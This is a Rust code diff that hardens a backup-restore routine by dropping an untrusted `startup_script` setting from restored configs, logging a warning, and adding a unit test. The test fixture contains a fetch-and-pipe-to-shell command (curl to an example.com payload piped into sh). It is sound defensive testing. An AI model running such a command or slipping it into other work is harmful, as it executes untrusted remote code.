@@ -65,6 +65,11 @@ fn resolve_within(dir: &Path, filename: &str) -> Result<PathBuf> {
     Ok(path)
 }
 
+/// Drops `startup_script` from untrusted restored settings; it must be enabled again explicitly.
+fn strip_untrusted_startup_script(verge: &mut IVerge) -> bool {
+    verge.startup_script.take().is_some()
+}
+
 /// Reloads restored configs into memory while preserving WebDAV credentials.
 async fn finalize_restored_verge_config(
     webdav_url: Option<String>,
@@ -73,6 +78,13 @@ async fn finalize_restored_verge_config(
 ) -> Result<()> {
     // A broken restored `verge.yaml` is a restore failure, not a reason to load defaults.
     let mut restored = help::read_yaml::<IVerge>(&verge_path()?).await?;
+    if strip_untrusted_startup_script(&mut restored) {
+        logging!(
+            warn,
+            Type::Backup,
+            "Ignored startup_script from the restored backup; enable it explicitly to run it again"
+        );
+    }
     restored.webdav_url = webdav_url;
     restored.webdav_username = webdav_username;
     restored.webdav_password = webdav_password;
@@ -418,7 +430,20 @@ pub async fn export_local_backup(filename: String, destination: String) -> Resul
 
 #[cfg(test)]
 mod tests {
-    use super::{resolve_within, sanitize_backup_filename};
+    use super::{resolve_within, sanitize_backup_filename, strip_untrusted_startup_script};
+    use crate::config::IVerge;
+
+    #[test]
+    fn restoring_a_backup_never_enables_the_startup_script() {
+        let mut verge = IVerge {
+            startup_script: Some("curl https://example.com/payload | sh".into()),
+            ..IVerge::default()
+        };
+
+        assert!(strip_untrusted_startup_script(&mut verge));
+        assert!(verge.startup_script.is_none());
+        assert!(!strip_untrusted_startup_script(&mut verge));
+    }
 
     #[test]
     fn rejects_backup_filenames_that_can_escape_the_backup_directory() {
